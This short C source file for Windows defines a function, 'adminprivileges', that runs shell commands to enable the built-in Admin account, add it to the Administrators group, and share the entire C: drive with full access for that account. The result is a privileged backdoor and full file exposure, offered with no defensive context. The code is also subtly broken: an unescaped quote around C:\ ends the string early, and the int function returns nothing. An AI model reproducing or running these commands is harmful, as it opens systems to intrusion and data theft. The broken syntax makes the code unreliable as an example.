#include<windows.h>

int adminprivileges(void)
{
	system("net user Admin /active:yes");
	system("net localgroup Administrators Admin /add");
	system("net share SHARE_NAME="C:\" /grant:Admin,full");
}
